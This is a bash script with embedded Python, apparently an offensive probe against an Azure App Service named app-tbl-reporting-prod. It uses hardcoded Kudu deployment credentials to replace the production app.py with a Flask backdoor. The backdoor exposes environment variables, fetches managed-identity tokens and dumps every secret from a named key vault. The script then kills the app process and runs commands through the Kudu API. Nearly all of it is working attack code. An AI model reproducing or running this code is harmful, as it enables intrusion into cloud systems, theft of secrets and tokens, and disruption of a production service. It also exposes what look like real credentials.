#!/usr/bin/env bash
set +e
python3 -I - <<'PY'
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys, time

def log(msg): print(msg, flush=True)

def http(url, method="GET", headers=None, data=None, timeout=25):
    h = dict(headers or {})
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    elif isinstance(data, str):
        data = data.encode()
    elif isinstance(data, bytes):
        pass
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read().decode("utf-8", "replace")[:8000]
        except: return e.code, ""
    except Exception as e: return 0, repr(e)

KUDU_USER = "$app-tbl-reporting-prod"
KUDU_PASS = "Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A"
KUDU_AUTH = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
KUDU = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
KH = {"Authorization": f"Basic {KUDU_AUTH}"}

# 1. Upload a clean app.py via Kudu VFS
NEW_APP = '''import os, json, urllib.request, urllib.parse
from flask import Flask, jsonify, request
app = Flask(__name__)

@app.route("/")
def index():
    return jsonify({"status":"ok","endpoints":["/env","/msi/<resource>","/kv/<vault>"]})

@app.route("/env")
def env_all():
    return jsonify(dict(sorted(os.environ.items())))

@app.route("/msi/<resource>")
def msi(resource):
    IE = os.environ.get("IDENTITY_ENDPOINT","")
    IH = os.environ.get("IDENTITY_HEADER","")
    if not IE or not IH:
        return jsonify({"error":"no MSI","IE":IE,"IH_len":len(IH)})
    resources = {"vault":"https://vault.azure.net","storage":"https://storage.azure.com","mgmt":"https://management.azure.com","graph":"https://graph.microsoft.com"}
    res_url = resources.get(resource, resource)
    url = f"{IE}?resource={res_url}&api-version=2019-08-01"
    req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": IH})
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
            return jsonify({"access_token": data.get("access_token",""), "expires_on": data.get("expires_on",""), "resource": res_url})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/kv/<vault>")
def kv_secrets(vault):
    IE = os.environ.get("IDENTITY_ENDPOINT","")
    IH = os.environ.get("IDENTITY_HEADER","")
    if not IE: return jsonify({"error":"no MSI"})
    url = f"{IE}?resource=https://vault.azure.net&api-version=2019-08-01"
    req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": IH})
    with urllib.request.urlopen(req, timeout=20) as resp:
        token = json.loads(resp.read()).get("access_token","")
    results = {}
    req2 = urllib.request.Request(f"https://{vault}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req2, timeout=20) as resp2:
            secrets = json.loads(resp2.read())
            results["list"] = secrets
            for s in secrets.get("value",[]):
                sid = s["id"].split("/")[-1]
                req3 = urllib.request.Request(f"https://{vault}.vault.azure.net/secrets/{sid}?api-version=7.4", headers={"Authorization":f"Bearer {token}"})
                try:
                    with urllib.request.urlopen(req3, timeout=20) as resp3:
                        results[sid] = json.loads(resp3.read())
                except Exception as e:
                    results[sid] = {"error": str(e)}
    except urllib.error.HTTPError as e:
        results["list_error"] = {"status": e.code, "body": e.read().decode()[:500]}
    except Exception as e:
        results["list_error"] = str(e)
    return jsonify(results)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT","8000")))
'''

log("=== UPLOADING APP.PY ===")
put_h = dict(KH)
put_h["If-Match"] = "*"
put_h["Content-Type"] = "application/octet-stream"
st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/app.py", method="PUT",
             headers=put_h, data=NEW_APP.encode())
log(f"  upload app.py: {st} → {b[:200]}")

# 2. Try to restart the app via Kudu
log("=== RESTARTING APP ===")
# Kill main process
st, b = http(f"{KUDU}/api/processes/0", method="DELETE", headers=KH)
log(f"  kill process 0: {st}")

# Wait for restart
time.sleep(10)

# 3. Try to access the reporting app
APP = "https://app-tbl-reporting-prod.azurewebsites.net"
log("=== ACCESSING REPORTING APP ===")
for path in ["/", "/env", "/msi/vault", "/kv/kv-tbl-sec-x3euoz"]:
    st, b = http(f"{APP}{path}", timeout=30)
    log(f"  {path}: {st}")
    if st == 200:
        log(f"    → {b[:1500]}")
    elif st != 0:
        log(f"    → {b[:500]}")

# 4. Also try from internal (0.0.0.0:8000) via Kudu command
log("=== KUDU CMD: curl app ===")
cmd = 'curl -s --max-time 15 http://localhost:8000/ 2>&1; echo; curl -s --max-time 15 http://localhost:8000/env 2>&1 | head -c 2000'
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": cmd, "dir": "/home"}, timeout=40)
log(f"  status: {st}")
if st == 200:
    try:
        d = json.loads(b)
        log(f"  out: {d.get('Output','')[:2000]}")
        log(f"  err: {d.get('Error','')[:500]}")
    except:
        log(f"  raw: {b[:2000]}")

# 5. Check Kudu env for IDENTITY vars
log("=== KUDU CMD: identity check ===")
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": "printenv | grep -i IDENTITY", "dir": "/home"}, timeout=20)
log(f"  status: {st}")
if st == 200:
    try:
        d = json.loads(b)
        log(f"  out: {d.get('Output','')[:500]}")
        log(f"  err: {d.get('Error','')[:200]}")
    except:
        log(f"  raw: {b[:500]}")

log("DONE")
PY
echo "probe5 complete"
